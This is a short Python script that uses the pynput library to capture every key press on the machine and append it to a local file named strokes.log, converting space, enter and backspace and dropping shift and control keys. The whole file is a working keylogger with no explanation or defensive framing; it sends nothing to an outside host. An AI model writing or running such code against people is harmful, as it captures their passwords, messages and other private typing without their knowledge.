from pynput.keyboard import Listener
import os


path = str(os.curdir) + "/strokes.log"
with open(os.path.abspath(path), 'w') as f:
    f.write("This is the keystroke log.\n")


def write(data):
    letter = str(data).replace("'", "")
    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.enter':
        letter = '\n'
    elif letter == 'Key.shift_r' or letter == 'Key.shift_l' or letter == 'Key.shift':
        letter = ''
    elif letter == 'Key.ctrl_r' or letter == 'Key.ctrl_l' or letter == 'Key.ctrl':
        letter = ''
    elif letter == 'Key.backspace':
        letter = '<BS>'
    with open(os.path.abspath(path), 'a') as f:
        f.write(letter)


with Listener(on_press=write) as listen:
    listen.join()
